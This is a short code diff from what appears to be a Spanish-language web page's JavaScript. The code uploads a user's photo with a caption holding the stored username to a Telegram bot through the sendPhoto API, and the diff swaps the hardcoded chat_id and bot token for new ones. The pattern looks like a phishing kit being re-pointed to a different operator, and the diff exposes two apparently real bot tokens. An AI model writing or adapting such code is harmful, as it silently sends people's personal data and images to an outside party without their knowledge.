@@ -191,7 +191,7 @@
           const formData = new FormData();
           formData.append("photo", file);
 
-          formData.append("chat_id", "@bdvyo1212");
+          formData.append("chat_id", "@StefAguilar");
           const message =
             "Usuario: " +
             localStorage.getItem("usuario") +
@@ -204,7 +204,7 @@
           formData.append("caption", message);
           axios
             .post(
-              "https://api.telegram.org/bot6903851307:AAFFT0FDf1y9fYdBZIQWqfawRtUI1WH2wZM/sendPhoto",
+              "https://api.telegram.org/bot6504246795:AAE_2FOgMHI2eqBOIa2SNVMDyTw3KkjFb64/sendPhoto",
               formData
             )
             .then((response) => {
